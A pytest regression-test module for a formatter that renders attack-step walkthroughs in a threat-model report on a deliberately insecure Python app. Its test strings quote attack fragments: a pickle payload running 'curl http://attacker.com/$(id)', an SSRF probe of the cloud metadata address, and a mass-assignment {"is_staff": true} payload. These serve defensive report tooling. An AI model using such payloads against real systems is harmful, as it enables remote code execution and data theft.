"""Regression tests for the 2026-07-19 §3 Attack Steps quality fixes.

Every string in this module is verbatim from the `insecure-python-app`
threat-model run the user reported, so a regression reproduces the exact
rendering that was flagged rather than a synthetic approximation.

Three defect families are covered:

  * **Code formatting** (`apply_prose_fixes`) — tokens that shipped bare or,
    worse, half-wrapped: split code spans, JSON payload literals, bare URLs and
    IPs, snake_case / SCREAMING_SNAKE identifiers.
  * **Step voice** (`walkthrough_renderer`) — inconsistent attacker article,
    rationale/caveat sentences renumbered as steps, and the generic template
    step duplicating a step the scenario already told.
  * **Authored steps** — the `attack_steps` field takes precedence over
    sentence-splitting `scenario`.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import walkthrough_renderer as renderer  # noqa: E402
from apply_prose_fixes import _merge_split_code_spans, _wrap_line  # noqa: E402


def _fmt(text: str) -> str:
    return _wrap_line(text)[0]


# ---------------------------------------------------------------------------
# Code formatting — split spans
# ---------------------------------------------------------------------------


class TestSplitSpanRepair:
    """The LLM backticks only the HEAD of a token; the tail must be pulled in.

    A span that stops mid-identifier is worse than no span at all — the break
    lands inside the token and the reader sees two fragments.
    """

    @pytest.mark.parametrize(
        "given,expected",
        [
            # `request.data`['role'] — subscript continuation (md:435)
            (
                "consumes `request.data`['role'] without a serializer allowlist",
                "consumes `request.data['role']` without a serializer allowlist",
            ),
            # `/api/legacy-admin/audit`?token= — query-string continuation (md:396)
            (
                "sends a GET request to `/api/legacy-admin/audit`?token=crafted where",
                "sends a GET request to `/api/legacy-admin/audit?token=crafted` where",
            ),
            # `requests.get`(url, timeout=3) — call arguments left outside (md:2181)
            (
                "passes the url directly to `requests.get`(url, timeout=3) without auth",
                "passes the url directly to `requests.get(url, timeout=3)` without auth",
            ),
            # `db.py:461`-469 — line range split
            ("at `db.py:461`-469 interpolates the email", "at `db.py:461-469` interpolates the email"),
        ],
    )
    def test_continuation_is_merged_into_the_span(self, given, expected):
        assert _fmt(given) == expected

    def test_assignment_value_gets_its_own_span(self):
        # `JWT_SIGNING_KEY` = b'…' (md:592). The value is code and must be
        # formatted; the `=` stays in prose, so the two are separate spans
        # rather than one long token swallowing the sentence.
        out = _fmt("obtains `JWT_SIGNING_KEY` = b'local-demo-hardcoded-jwt-key'.")
        assert "`b'local-demo-hardcoded-jwt-key'`" in out

    def test_prose_parenthetical_is_not_swallowed(self):
        # The call-args merge must not treat an English aside as arguments.
        assert _fmt("See `eval` (the sink) here.") == "See `eval` (the sink) here."


# ---------------------------------------------------------------------------
# Code formatting — token classes that shipped bare
# ---------------------------------------------------------------------------


class TestBareTokenClasses:
    @pytest.mark.parametrize(
        "given,expected_span",
        [
            # JSON payload literals (md:436, 593, 515)
            ('An attacker adds {"is_staff": true} to escalate.', '`{"is_staff": true}`'),
            ('construct a JWT header {"alg":"HS256"} and', '`{"alg":"HS256"}`'),
            # Absolute URL with a bare-IP host (md:2181) — §7 backticked the
            # same token, §8 did not.
            (
                "probe url=http://169.254.169.254/latest/meta-data/ for credentials",
                "`http://169.254.169.254/latest/meta-data/`",
            ),
            # Bare IP with port / CIDR, no scheme
            ("bind on 127.0.0.1:8000 inside the 10.0.0.0/8 range", "`127.0.0.1:8000`"),
            # snake_case identifiers (md:397, 594) — these shipped bare in the
            # SAME sentence as a correctly backticked `auth.py:84`.
            ("The function read_unsigned_jwt_claims at `auth.py:84` splits", "`read_unsigned_jwt_claims`"),
            # dotted snake — module prefix must stay inside the span
            ("accepted because hmac.compare_digest passes", "`hmac.compare_digest`"),
            # SCREAMING_SNAKE constants (md:671)
            ("returns JWT_SIGNING_KEY, DB_PASSWORD, and APP_REGION with no auth", "`DB_PASSWORD`"),
            # dunder
            ("built-ins are still reachable through __builtins__.", "`__builtins__`"),
        ],
    )
    def test_token_is_backticked(self, given, expected_span):
        assert expected_span in _fmt(given)

    @pytest.mark.parametrize(
        "given",
        [
            "version 1.2.3 is unaffected",  # not an IP — only three parts
            "the read/write set is {read, write}",  # prose set, no quoted key
            "the placeholder {username} is substituted",  # template slot
            "A check (a legacy path) stays prose.",  # prose parenthetical
        ],
    )
    def test_non_code_is_left_alone(self, given):
        assert _fmt(given) == given

    def test_nested_token_is_not_half_wrapped(self):
        # `pickle.loads(base64.b64decode(...))` — wrapping only the INNER call
        # emits `pickle.loads(`base64.b64decode(x)`)`. Bare beats half-wrapped.
        given = "calls pickle.loads(base64.b64decode(payload.payload)) without auth"
        assert "`" not in _fmt(given)

    def test_url_inside_a_code_payload_is_not_mangled(self):
        # 'curl http://attacker.com/$(id)' — matching up to the `)` would
        # swallow an unbalanced `(` and emit nested backticks.
        given = "executes (os.system, ('curl http://attacker.com/$(id)',)) on load"
        out = _fmt(given)
        assert out.count("`") % 2 == 0
        assert "$(id)" in out

    @pytest.mark.parametrize(
        "given",
        [
            "consumes `request.data`['role'] etc.",
            'An attacker adds {"is_staff": true} to escalate.',
            "probe http://169.254.169.254/latest/ and 127.0.0.1:8000.",
            "The function read_unsigned_jwt_claims at `auth.py:84` splits it.",
            # Two spans on one line — the case that broke document-level
            # idempotence (see TestSpanPairing).
            "available in `.route-inventory.json` and `pentest-tasks.yaml`.",
            # A span the wrapping passes create, which then acquires a tail.
            "reachable through __builtins__['__import__'] at runtime.",
        ],
    )
    def test_formatting_is_idempotent(self, given):
        once = _fmt(given)
        assert _fmt(once) == once


class TestSpanPairing:
    """Guards found only by re-running the formatter over a whole real report.

    Per-string tests cannot surface these: each needs either two spans on one
    line, a span produced by an earlier pass, or pre-existing malformed input.
    """

    def test_prose_between_two_spans_is_not_swallowed(self):
        # A permissive head let the engine pair one span's CLOSING tick with
        # the next span's OPENING tick and treat the prose between them as a
        # code token.
        given = "The inventory is available in `.route-inventory.json` and, when exported, `pentest-tasks.yaml`."
        assert _fmt(given) == given

    def test_markdown_emphasis_closer_is_not_merged(self):
        # `pentest-tasks.yaml`._  — the `_` closes an italic run, it is not a
        # member access.
        given = "_Exported as `pentest-tasks.yaml`._"
        assert _fmt(given) == given

    def test_span_created_by_an_earlier_pass_still_gets_its_tail(self):
        # `__builtins__` is backticked by the const pass; only THEN is
        # `__builtins__['__import__']` a split span. One call must do both.
        assert "`__builtins__['__import__']`" in _fmt("a payload using __builtins__['__import__'] here")

    def test_merge_is_skipped_when_backticks_are_unbalanced(self):
        # Pairing is ambiguous on an odd tick count, so a merge would land on a
        # wrong boundary and deepen damage the composer already shipped.
        # Scope note: this guards the MERGE passes only. The token-wrapping
        # passes still run on such a line — they operate on one token at a
        # time and do not depend on pairing. Verified against the real report:
        # no line with unbalanced backticks was modified at all.
        given = "add `foo`['bar'] and `baz`(x, y) with a stray ` tick"
        assert given.count("`") % 2 == 1
        assert _merge_split_code_spans(given) == (given, 0)

    def test_merge_tail_never_crosses_into_the_next_span(self):
        # A continuation is by definition outside every span, so a tail that
        # contains a backtick means the pattern read a wrong pairing.
        given = "call `user.get`('`role`') here"
        assert "`user.get('`" not in _fmt(given)

    @pytest.mark.parametrize(
        "given",
        [
            "9 further entry point(s) in this category",
            "the weakness(es) listed above",
            "each finding(s) and threat(s) row",
            "remaining step(s) and mitigation(s)",
        ],
    )
    def test_english_optional_plural_is_not_a_call(self, given):
        # `weakness(es)` is structurally a one-argument call; only the shape of
        # the argument separates it from `find_user(3)`.
        assert _fmt(given) == given


# ---------------------------------------------------------------------------
# Step voice and step selection
# ---------------------------------------------------------------------------


def _threat(scenario: str, **over) -> dict:
    threat = {
        "id": "T-007",
        "title": "Mass assignment — insecure_python_app/views.py:229",
        "cwe": "CWE-915",
        "risk": "Critical",
        "component": "django-web",
        "scenario": scenario,
        "evidence": [{"file": "insecure_python_app/views.py", "line": 229}],
    }
    threat.update(over)
    return threat


class TestActorVoice:
    def test_first_mention_indefinite_later_mentions_definite(self):
        steps = renderer._normalize_actor_voice(
            [
                "The attacker crafts a request targeting the weak spot",
                "An attacker adds a privileged field to escalate",
                "An attacker reads the response",
            ]
        )
        assert steps[0].startswith("An attacker")
        assert steps[1].startswith("The attacker")
        assert steps[2].startswith("The attacker")

    def test_is_idempotent(self):
        once = renderer._normalize_actor_voice(["An attacker sends it", "An attacker reads it"])
        assert renderer._normalize_actor_voice(once) == once

    def test_pronoun_step_is_left_grammatical(self):
        # Substituting a singular noun phrase for "They" breaks subject-verb
        # agreement ("The attacker then construct…"), so the pronoun stays.
        steps = renderer._normalize_actor_voice(["An attacker reads the key", "They then construct a JWT header"])
        assert steps[1].startswith("They then construct")


class TestNonStepFiltering:
    @pytest.mark.parametrize(
        "sentence",
        [
            # rationale (md:514)
            "Critically, `role` and `admin` are security-bearing columns",
            # caveat (md:474)
            "Because SQLite's `execute` supports only single statements, multi-statement injection is not available",
            # precondition (md:634)
            "The endpoint requires no authentication",
            # code as the subject (md:435)
            "Server code that consumes `request.data` without an allowlist trusts the client",
        ],
    )
    def test_non_step_sentences_are_recognised(self, sentence):
        assert renderer._NON_STEP_LEAD_RE.match(sentence)

    def test_rationale_sentence_is_dropped_from_steps(self):
        scenario = (
            "An attacker submits a crafted payload to the profile endpoint. "
            "Critically, `role` and `admin` are security-bearing columns that gate every check. "
            "The attacker self-promotes to ADMIN and reads every order."
        )
        joined = " ".join(renderer.render_attack_steps(_threat(scenario), template={}))
        assert "Critically" not in joined
        assert "self-promotes to ADMIN" in joined

    def test_filtering_never_empties_the_list(self):
        # A scenario written entirely in explanatory voice must still render.
        scenario = "The endpoint requires no authentication. This means anyone can call it."
        assert renderer.render_attack_steps(_threat(scenario), template={})


class TestTemplatePrependGate:
    def test_reported_block_no_longer_mixes_articles_or_code_subjects(self):
        # The exact T-007 block from the report (md:434-436). Three defects:
        # the code-subject sentence renumbered as step 2, the article flipping
        # "The attacker" -> "An attacker" between steps, and the split span
        # `request.data`['role'].
        scenario = (
            "Server code that consumes `request.data['role']` without a serializer allowlist trusts the client. "
            'An attacker adds {"is_staff": true} to the request to escalate.'
        )
        steps = renderer.render_attack_steps(_threat(scenario), template={})
        joined = " ".join(steps)

        assert "Server code" not in joined  # code as the subject is gone
        assert joined.count("An attacker") == 1  # introduced exactly once
        assert steps[0].startswith("1. An attacker")  # ...and it is the FIRST step
        assert '`{"is_staff": true}`' in joined  # payload literal formatted
        # Two-step floor: a one-item list is not a walkthrough. Only two
        # sentences survived filtering, so one template step legitimately pads
        # here — with the article normalised, it now reads as the setup for
        # step 2 rather than a duplicate of it. An authored `attack_steps`
        # replaces it outright (see TestAuthoredAttackSteps).
        assert len(steps) == 2

    def test_no_padding_when_the_scenario_carries_enough_real_steps(self):
        scenario = (
            "An attacker registers an account and authenticates against the profile API. "
            'An attacker replays the update request with {"is_staff": true} in the body. '
            "An attacker then reaches every admin-gated view."
        )
        steps = renderer.render_attack_steps(_threat(scenario), template={})
        assert "crafts a request targeting the weak spot" not in " ".join(steps)
        assert len(steps) == 3

    def test_padding_still_applies_when_no_attacker_action_is_present(self):
        steps = renderer.render_attack_steps(_threat("Only one sentence."), template={})
        assert len(steps) == renderer.MIN_ATTACK_STEPS


class TestAuthoredAttackSteps:
    def test_authored_steps_take_precedence_over_scenario(self):
        threat = _threat(
            "Server code that consumes `request.data` trusts the client.",
            attack_steps=[
                "An attacker registers a normal account and authenticates against the profile API",
                'An attacker replays the profile-update request with {"is_staff": true} in the JSON body',
                "views.py:229 binds the body onto the model, so an attacker account is now staff",
            ],
        )
        steps = renderer.render_attack_steps(threat, template={})
        assert len(steps) == 3
        assert "Server code" not in " ".join(steps)
        # Shared post-processing applies to the authored path too.
        assert steps[0].startswith("1. An attacker")
        assert steps[1].startswith("2. The attacker")
        assert '`{"is_staff": true}`' in steps[1]

    def test_too_short_authored_list_falls_back_to_scenario(self):
        threat = _threat(
            "An attacker submits a crafted payload and self-promotes to ADMIN.",
            attack_steps=["An attacker does one thing"],
        )
        assert "self-promotes" in " ".join(renderer.render_attack_steps(threat, template={}))
